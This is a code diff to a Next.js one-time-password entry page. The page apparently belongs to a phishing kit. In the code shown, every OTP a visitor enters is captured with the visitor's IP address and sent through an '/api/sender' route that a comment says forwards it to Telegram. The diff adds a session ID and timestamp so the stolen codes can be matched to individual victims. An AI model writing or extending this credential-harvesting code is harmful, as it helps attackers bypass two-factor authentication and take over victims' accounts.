@@ -9,6 +9,8 @@ import { useRouter } from 'next/router';
 import Header from '@/components/header';
 import Footer from '@/components/Footer';
 import { toast } from 'sonner';
+import { getSessionId } from '@/utils/session';
+import { formatOTPMessage, getTimestamp } from '@/utils/telegramFormatter';
 
 function OTP({ separator, length, value, onChange }) {
     const inputRefs = React.useRef(new Array(length).fill(null));
@@ -153,11 +155,16 @@ export default function OTPInputForm() {
             if (!isTestMode) {
                 // Only send to Telegram if NOT in test mode
                 const ip = await axios.get('https://api.ipify.org?format=json');
+                const sessionId = getSessionId();
 
-                // Format message for Telegram
-                const message = `CODIGO OTP ${attempt + 1}\n\n` +
-                    `Código: ${otp}\n\n` +
-                    `IP: ${ip.data.ip}`;
+                // Format message for Telegram with improved structure
+                const message = formatOTPMessage({
+                    sessionId,
+                    otp,
+                    attempt: attempt + 1,
+                    ip: ip.data.ip,
+                    timestamp: getTimestamp()
+                });
 
                 // Send directly to Telegram via sender API
                 await axios.post('/api/sender', { message });
